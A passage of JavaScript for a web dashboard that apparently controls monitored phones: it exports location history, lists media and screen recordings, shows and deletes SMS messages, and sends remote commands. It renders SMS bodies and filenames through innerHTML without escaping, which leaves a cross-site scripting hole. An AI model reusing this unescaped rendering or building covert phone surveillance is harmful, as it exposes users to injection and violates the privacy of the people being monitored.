          btnLive.textContent = "Stop Live Stream";
        } else {
          this.liveStream.close();
          this.liveStream = null;
          btnLive.textContent = "Start Live Stream";
        }
      };

      // export CSV
      const btnExport = document.createElement("button");
      btnExport.className = "btn btn-sm btn-outline-secondary ms-2";
      btnExport.textContent = "Export CSV";
      controls.appendChild(btnExport);

      btnExport.onclick = async () => {
        const resp = await this.api.get(`/devices/${deviceId}/locations?all=true`);
        const points = resp.data?.items || resp.data || [];

        const csv = points
          .map((p) => `${p.latitude},${p.longitude},${p.timestamp}`)
          .join("\n");

        const blob = new Blob([csv], { type: "text/csv" });
        const url = URL.createObjectURL(blob);

        const a = document.createElement("a");
        a.href = url;
        a.download = `${deviceId}-locations.csv`;
        a.click();
      };
    } catch (err) {
      console.warn("loadLocation failed", err);
      document.getElementById("device-location").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // Media list
  // ------------------------------------------------------------
  async loadMediaList() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const resp = await this.api.get(`/devices/${deviceId}/media`);
      const items = resp.data || resp;

      const host = document.getElementById("device-media-list");
      host.innerHTML = `
        <div class="row g-2">
          ${(items || [])
            .map(
              (m) => `
            <div class="col-6 col-md-3">
              <div class="card p-1 h-100">
                <img src="/uploads/media/${m.filename}" style="max-width:100%">
                <div class="p-1">
                  <small>${m.filename}</small>
                  <div class="mt-1">
                    <a class="btn btn-sm btn-outline-secondary"
                      href="/api/media/${m.id}/download">Download</a>
                  </div>
                </div>
              </div>
            </div>
          `
            )
            .join("")}
        </div>
      `;
    } catch (err) {
      console.warn("loadMediaList failed", err);
      document.getElementById("device-media-list").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // Screen recordings
  // ------------------------------------------------------------
  async loadScreenList() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const resp = await this.api.get(`/devices/${deviceId}/screen-recordings`);
      const items = resp.data || resp;

      const host = document.getElementById("device-screen-list");
      host.innerHTML = `
        <ul class="list-group">
          ${(items || [])
            .map(
              (s) => `
            <li class="list-group-item d-flex justify-content-between">
              <span>${s.filename}</span>
              <a class="btn btn-sm btn-outline-secondary"
                href="/api/screen-recordings/${s.id}/download">Download</a>
            </li>
          `
            )
            .join("")}
        </ul>
      `;
    } catch (err) {
      console.warn("loadScreenList failed", err);
      document.getElementById("device-screen-list").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // SMS
  // ------------------------------------------------------------
  async loadSMS() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const resp = await this.api.get(`/devices/${deviceId}/sms`);
      const msgs = resp.data || resp;

      const host = document.getElementById("device-sms");
      host.innerHTML = `
        <div class="table-responsive">
          <table class="table table-sm table-hover">
            <thead><tr><th>From</th><th>Body</th><th>Date</th><th></th></tr></thead>
            <tbody>
              ${(msgs || [])
                .map(
                  (m) => `
                <tr>
                  <td>${m.address}</td>
                  <td>${m.body}</td>
                  <td>${new Date(m.timestamp || m.date).toLocaleString()}</td>
                  <td>
                    ${
                      this.isAdmin
                        ? `<button class="btn btn-sm btn-danger btn-del-sms"
                              data-id="${m.id}">
                              Delete
                            </button>`
                        : ""
                    }
                  </td>
                </tr>
              `
                )
                .join("")}
            </tbody>
          </table>
        </div>
      `;

      if (this.isAdmin) {
        host.querySelectorAll(".btn-del-sms").forEach((btn) => {
          btn.onclick = async () => {
            if (!confirm("Delete SMS?")) return;
            await this.api.del(`/sms/${btn.dataset.id}`);
            this.loadSMS();
          };
        });
      }
    } catch (err) {
      console.warn("loadSMS failed", err);
      document.getElementById("device-sms").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // Commands history (paginated, admin only)
// ------------------------------------------------------------
  async loadCommandsHistory() {
    if (!this.isAdmin) {
      const host = document.getElementById("device-commands");
      if (host) host.textContent = "Commands are available only for admin role.";
      return;
    }

    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const host = document.getElementById("device-commands");
      if (!host) return;
      host.innerHTML = "";

      const renderPage = async (page, limit) => {
        const resp = await this.api.get(
          `/commands?deviceId=${deviceId}&page=${page}&limit=${limit}`
        );
        const cmds = resp.data?.items || resp.data || [];
        const total = resp.data?.total || cmds.length;

        host.querySelector(".cmd-list")?.remove();

        const table = document.createElement("table");
        table.className = "table table-sm table-hover cmd-list";

        table.innerHTML = `
          <thead>
            <tr><th>ID</th><th>Type</th><th>Status</th><th>When</th><th></th></tr>
          </thead>
          <tbody>
            ${cmds
              .map(
                (c) => `
              <tr>
                <td>${c.id}</td>
                <td>${c.command_type}</td>
                <td>${c.status}</td>
                <td>${new Date(c.createdAt || c.timestamp).toLocaleString()}</td>
                <td>
                  ${
                    c.response
                      ? `<button class="btn btn-sm btn-outline-secondary btn-view-cmd"
                          data-id="${c.id}">
                          View
                        </button>`
                      : ""
                  }
                </td>
              </tr>
            `
              )
              .join("")}
          </tbody>
        `;

        host.appendChild(table);

        table.querySelectorAll(".btn-view-cmd").forEach((btn) => {
          btn.onclick = async () => {
            const r = await this.api.get(`/commands/${btn.dataset.id}`);
            this.ui.showModal(
              "Command Response",
              `<pre>${JSON.stringify(r.data || r, null, 2)}</pre>`
            );
          };
        });

        return { hasMore: page * limit < total };
      };

      const paginator = this.createPaginator("commands", renderPage, 1, 100);
      host.appendChild(paginator.wrapper);
      await paginator.init();
    } catch (err) {
      console.warn("loadCommandsHistory failed", err);
      const host = document.getElementById("device-commands");
      if (host) host.textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // Send command
  // ------------------------------------------------------------
  async sendCommand(type, payload = {}) {
    if (!this.current) return;
    if (!this.isAdmin && type !== "get_info") {
      this.ui.showError("Only admin can send commands.");
      return;
    }

    const deviceId = this.current.deviceId || this.current.device_id || this.current.id;

    try {
      await this.api.post("/commands", {
        deviceId,
        command_type: type,
        command_data: payload,
      });

      this.ui.showNotification("Command sent", "info", 2000);
      if (this.isAdmin) this.loadCommandsHistory();
    } catch (err) {
      console.error("Send command failed", err);
      this.ui.showError("Command failed: " + (err.message || ""));
    }
  }

  // ------------------------------------------------------------
  // Set offline
  // ------------------------------------------------------------
  async setOffline() {
    if (!this.isAdmin) {
      this.ui.showError("Only admin can set device offline.");
      return;
    }

    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      await this.api.post(`/devices/${deviceId}/set-offline`);
      this.ui.showNotification("Device set offline");
    } catch (err) {
      console.warn("setOffline failed", err);
    }
  }

  // ------------------------------------------------------------
  // Refresh
  // ------------------------------------------------------------
  async refresh() {
    if (!this.current) return;
    try {
      const resp = await this.api.get(`/devices/${this.current.id}`);
      this.current = resp.data || resp;
      await this.renderFor(this.current);
    } catch (err) {
      console.warn("refresh failed", err);
    }
  }
}
